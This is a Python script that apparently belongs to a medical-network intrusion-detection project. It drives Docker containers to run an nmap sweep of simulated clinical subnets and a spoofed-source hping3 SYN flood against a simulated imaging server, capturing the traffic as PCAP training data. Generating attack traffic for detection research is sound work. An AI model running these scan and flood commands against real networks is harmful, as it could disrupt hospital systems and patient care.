import subprocess
import argparse
import time
import os
import sys
from pathlib import Path

# --- Configuration ---
ROUTER_CONTAINER = "hospital_router"
ATTACKER_CONTAINER = "hacker_apt_external"
OUTPUT_DIR = Path("output_datasets")

def run_docker_exec(container, command, detach=False):
    """Executes a command inside a specific Docker container."""
    print(f"[{container}] Executing: {command}")
    cmd_list = ["docker", "exec", "-u", "root"]
    if detach:
        cmd_list.append("-d")
    cmd_list.extend([container, "sh", "-c", command])

    if detach:
        subprocess.Popen(cmd_list, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    else:
        result = subprocess.run(cmd_list, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"Error [{container}]: {result.stderr}")
            return False
        return result.stdout.strip()

def check_containers():
    """Verify that both the router and the attacker containers are actively running."""
    print("[*] Verifying Docker environment state...")
    result = subprocess.run(["docker", "ps", "--format", "{{.Names}}"], capture_output=True, text=True)
    running = result.stdout.split('\n')
    if ROUTER_CONTAINER not in running or ATTACKER_CONTAINER not in running:
        print(f"[!] Critical Error: Missing required containers.")
        print(f"Ensure {ROUTER_CONTAINER} and {ATTACKER_CONTAINER} are running via docker-compose.")
        sys.exit(1)
    print("[*] Required containers are active.")

def setup_environment():
    """Installs necessary attacking tools (nmap, hping3) and capture tools (tcpdump)."""
    print(f"\n[*] Injecting dependencies into [{ROUTER_CONTAINER}]...")
    run_docker_exec(ROUTER_CONTAINER, "apk update && apk add tcpdump")

    print(f"[*] Injecting hacking tools into [{ATTACKER_CONTAINER}]...")
    # Add nmap and hping3 (from edge testing repo)
    run_docker_exec(ATTACKER_CONTAINER, "apk update && apk add nmap hping3 --repository=http://dl-cdn.alpinelinux.org/alpine/edge/testing/")
    print("[*] Environment preparation complete.\n")

def start_capture():
    """Starts tcpdump on the router in the background."""
    print("[*] Initializing live Network Tap (tcpdump) on the Router...")
    run_docker_exec(ROUTER_CONTAINER, "rm -f /tmp/attack_pcap.pcap")
    # Capture all interfaces bridging the zones
    run_docker_exec(ROUTER_CONTAINER, "tcpdump -i any -w /tmp/attack_pcap.pcap", detach=True)
    time.sleep(2) # Allow tcpdump to spin up
    print("[*] Router is now officially capturing all physical cross-layer traffic.")

def stop_capture_and_extract(output_name="physical_attack.pcap"):
    """Stops tcpdump and copies the generated PCAP out of the Docker container."""
    print(f"\n[*] Stopping Network Tap on [{ROUTER_CONTAINER}]...")
    run_docker_exec(ROUTER_CONTAINER, "pkill tcpdump || true")
    time.sleep(2) # Allow buffer flush

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    out_path = OUTPUT_DIR / output_name

    print(f"[*] Extracting Raw PCAP to {out_path}...")
    subprocess.run(["docker", "cp", f"{ROUTER_CONTAINER}:/tmp/attack_pcap.pcap", str(out_path)])
    print(f"\n[SUCCESS] Physical Detonation Complete. PCAP extracted: {out_path}")
    print("[*] This PCAP contains real payload bytes from Alpine Linux OS interactions, perfect for DPI analysis.")

def execute_recon_attack():
    """Detonates a loud NMAP Ping/Port Sweep against the clinical subnets."""
    print("\n==============================================")
    print("🔥 INITIATING: Aggressive Reconnaissance Sweep")
    print("==============================================")
    print("[*] Attacker is sweeping the IT (10.0.1.0/24) and Clinical Core (10.0.2.0/24) zones...")
    
    # We do a slightly aggressive, but fast scan so we don't wait forever
    stdout = run_docker_exec(ATTACKER_CONTAINER, "nmap -T4 -F 10.0.1.0/24 10.0.2.0/24")
    print("\n--- [NMAP HIGHLIGHTS] ---")
    # Print the first few lines of output
    lines = str(stdout).split('\n')
    for line in lines:
       if "report for" in line or "open" in line:
           print("    " + line)
    print("-------------------------\n")

def execute_dos_attack():
    """Detonates a SYN Flood Denial of Service against the PACS imaging server."""
    print("\n==============================================")
    print("🔥 INITIATING: SYN Flood Denial of Service")
    print("==============================================")
    # Target PACS Server: pacs-server-01 is explicitly 10.0.2.11 in configs
    target_ip = "10.0.2.11" 
    print(f"[*] Attacker is unleashing hping3 SYN flood against PACS Server ({target_ip})...")
    
    # Send 5000 fast SYN packets masquerading as randomized source
    run_docker_exec(ATTACKER_CONTAINER, f"hping3 -c 5000 -d 120 -S -w 64 -p 443 --flood --rand-source {target_ip}", detach=True)
    
    # Let it run for 10 seconds to generate massive physical load on the internal Docker Linux network adapters
    for i in range(10, 0, -1):
        print(f"    Flooding active... {i} seconds remaining.", end='\r')
        time.sleep(1)
    
    print("\n[*] Halting DoS Flood.")
    run_docker_exec(ATTACKER_CONTAINER, "pkill hping3 || true")

def main():
    parser = argparse.ArgumentParser(description="IoMT Physical Docker Attack Detonator (World 2)")
    parser.add_argument("--attack", choices=["recon", "dos", "all"], default="all", help="Select the cyber kill-chain module to explicitly execute physically.")
    parser.add_argument("--capture-name", default="physical_attack_sample.pcap", help="Output filename for the extracted traffic capture.")
    
    args = parser.parse_args()

    print(f"🏥 IoMT Medical NIDS Simulator - Physical Attack Detonator 💀")
    print("================================================================")
    
    check_containers()
    setup_environment()
    
    start_capture()
    
    try:
        if args.attack in ["recon", "all"]:
            execute_recon_attack()
            time.sleep(3) # Wait between stages
            
        if args.attack in ["dos", "all"]:
            execute_dos_attack()
            
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user. Extracting partial PCAP...")
    
    finally:
        stop_capture_and_extract(args.capture_name)


if __name__ == "__main__":
    main()
